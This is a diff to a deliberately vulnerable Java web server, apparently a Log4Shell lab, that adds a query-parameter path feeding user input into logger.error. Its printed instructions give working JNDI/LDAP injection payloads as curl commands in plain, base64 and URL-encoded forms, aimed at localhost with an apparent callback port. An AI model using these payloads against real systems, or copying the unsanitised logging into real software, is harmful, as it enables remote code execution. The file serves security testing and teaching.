@@ -34,15 +34,18 @@ public class Log4jWebServer {
     
     System.out.println("You can call it using curl. Depending on your terminal you ");
     System.out.println("may need to escape the string :");
-    System.out.println("curl -H 'log_me: ${jndi:ldap://127.0.0.1:1389/#MM_127_0_0_1_4444}' http://127.0.0.1:"+port+"/");
+    System.out.println("curl -H 'log_me: ${jndi:ldap://127.0.0.1:1389/#MM:127.0.0.1:4444}' http://127.0.0.1:"+port+"/");
     System.out.println("");
     System.out.println("If the log_me header is not found it will look for a log_me_b64");
     System.out.println("header and do a base 64 decode prior to logging.");
     System.out.println("The above log_me curl example would look like : ");
-    System.out.println("curl -H 'log_me_b64: JHtqbmRpOmxkYXA6Ly8xMjcuMC4wLjE6MTM4OS8jTU1fMTI3XzBfMF8xXzQ0NDR9Cg==' http://127.0.0.1:"+port+"/");
+    System.out.println("curl -H 'log_me_b64:JHtqbmRpOmxkYXA6Ly8xMjcuMC4wLjE6MTM4OS8jTU06MTI3LjAuMC4xOjQ0NDR9Cg==' http://127.0.0.1:"+port+"/");
     System.out.println("");
     System.out.println("On a linux system with base64 installed you can also use : ");
-    System.out.println("curl -H \"log_me_b64: `echo '${jndi:ldap://127.0.0.1:1389/#MM_127_0_0_1_4444}' | base64 -w 0`\" http://127.0.0.1:"+port+"/");
+    System.out.println("curl -H \"log_me_b64: `echo '${jndi:ldap://127.0.0.1:1389/#MM:127.0.0.1:4444}' | base64 -w 0`\" http://127.0.0.1:"+port+"/");
+    System.out.println("");
+    System.out.println("You can now also pass a param log_me.  It needs to be the only param and url encoded:");
+    System.out.println("curl http://127.0.0.1:"+port+"?log_me=%24%7Bjndi%3Aldap%3A%2F%2F127.0.0.1%3A1389%2F%23MM%3A127.0.0.1%3A4444%7D");
     System.out.println("");
    
     new Log4jWebServer().runServer(port); 
@@ -66,10 +69,20 @@ public class Log4jWebServer {
 
       String log_me = t.getRequestHeaders().getFirst("log_me");
       String log_me_b64 = t.getRequestHeaders().getFirst("log_me_b64");
-
+      String log_me_p = null;
+      String query = t.getRequestURI().getQuery();
+      if( query != null && query.startsWith("log_me=")){
+        System.out.println(" the query is "+query);
+        log_me_p = query.substring(7);
+      }
+      
       String response = "<html><body><h1>Please do not host this on a public computer!!!!</h1>\n";
-      if( (log_me == null) && (log_me_b64 == null) ){
+      if( (log_me == null) && (log_me_b64 == null) && (log_me_p == null)){
         response += "<h3>No logs were written.  Please see the startup output for how to enable logs.</h3>";
+      }
+      else if (log_me_p != null){
+        response += "<h3>Your log_me parameter was : "+log_me_p+"</h3>";
+        this.logger.error(""+ip+" : "+log_me_p);
       }
       else if (log_me != null){
         response += "<h3>Your log_me header was : "+log_me+"</h3>";
